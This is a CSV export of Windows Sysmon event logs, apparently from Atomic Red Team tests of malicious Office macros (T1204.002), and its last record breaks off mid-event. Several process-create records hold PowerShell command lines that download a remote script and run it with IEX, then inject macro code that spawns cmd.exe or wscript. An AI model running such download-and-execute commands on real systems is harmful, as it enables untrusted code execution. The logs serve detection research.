Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19586,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:45.944

ProcessGuid: {f57bd86a-a3f1-658c-ce01-000000000f00}

ProcessId: 10524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3f1-658c-ce01-000000000f00},3588,10524,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:45.9474035Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:45.944,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:45.9474035Z""/>
      <EventRecordID>19586</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:45.944</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3f1-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">10524</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:45.944

ProcessGuid: {f57bd86a-a3f1-658c-ce01-000000000f00}

ProcessId: 10524

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19585,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:22.615

ProcessGuid: {f57bd86a-a3ed-658c-c901-000000000f00}

ProcessId: 2980

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3ed-658c-c901-000000000f00},3588,2980,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T22:23:44.5767269Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:22.615,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:44.5767269Z""/>
      <EventRecordID>19585</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:22.615</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ed-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">2980</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:22.615

ProcessGuid: {f57bd86a-a3ed-658c-c901-000000000f00}

ProcessId: 2980

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:23:43.849,,,,,,,,11,19584,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:23:43.849

ProcessGuid: {f57bd86a-a3ef-658c-cb01-000000000f00}

ProcessId: 2020

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1lohpg4r.pcy.ps1

CreationUtcTime: 2023-12-27 22:23:43.849

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3ef-658c-cb01-000000000f00},3588,2020,,,,,,"
      ",-,,,,,,2023-12-27T22:23:43.8640894Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1lohpg4r.pcy.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:43.849,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:43.8640894Z""/>
      <EventRecordID>19584</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:43.849</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ef-658c-cb01-000000000f00}</Data>
      <Data Name=""ProcessId"">2020</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1lohpg4r.pcy.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:23:43.849</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:23:43.849

ProcessGuid: {f57bd86a-a3ef-658c-cb01-000000000f00}

ProcessId: 2020

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1lohpg4r.pcy.ps1

CreationUtcTime: 2023-12-27 22:23:43.849

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19583,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:43.725

ProcessGuid: {f57bd86a-a3ef-658c-cb01-000000000f00}

ProcessId: 2020

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a3ef-658c-cb01-000000000f00},3588,2020,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:23:43.7264779Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:43.725,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:43.7264779Z""/>
      <EventRecordID>19583</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:43.725</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ef-658c-cb01-000000000f00}</Data>
      <Data Name=""ProcessId"">2020</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:43.725

ProcessGuid: {f57bd86a-a3ef-658c-cb01-000000000f00}

ProcessId: 2020

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19582,,,<unknown process>,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:20.540

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 4520

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{00000000-0000-0000-0000-000000000000},3588,4520,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;,0,"
      ",-,,,,,,2023-12-27T22:23:42.5640914Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:20.540,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:42.5640914Z""/>
      <EventRecordID>19582</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:20.540</Data>
      <Data Name=""ProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ProcessId"">4520</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:20.540

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 4520

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:23:41.398,,,,,,,,11,19581,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:23:41.398

ProcessGuid: {f57bd86a-a3ed-658c-c901-000000000f00}

ProcessId: 2980

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lxazwesa.f1d.ps1

CreationUtcTime: 2023-12-27 22:23:41.398

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3ed-658c-c901-000000000f00},3588,2980,,,,,,"
      ",-,,,,,,2023-12-27T22:23:41.4105884Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lxazwesa.f1d.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:41.398,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:41.4105884Z""/>
      <EventRecordID>19581</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:41.398</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ed-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">2980</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lxazwesa.f1d.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:23:41.398</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:23:41.398

ProcessGuid: {f57bd86a-a3ed-658c-c901-000000000f00}

ProcessId: 2980

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lxazwesa.f1d.ps1

CreationUtcTime: 2023-12-27 22:23:41.398

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19580,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:23:41.269

ProcessGuid: {f57bd86a-a3ed-658c-c901-000000000f00}

ProcessId: 2980

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

